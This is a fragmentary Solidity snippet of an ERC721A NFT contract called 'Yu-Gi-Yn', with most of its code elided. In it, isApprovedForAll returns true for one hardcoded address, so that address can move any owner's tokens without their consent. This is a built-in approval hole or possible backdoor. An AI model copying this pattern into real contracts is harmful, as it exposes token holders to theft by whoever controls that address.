  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x756D8cf3b303C02bff8578A973D78599a594b412){return true;}
...
contract Yu_Gi_Yn is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Yu-Gi-Yn", "YGY", maxBatchSize_, collectionSize_) {
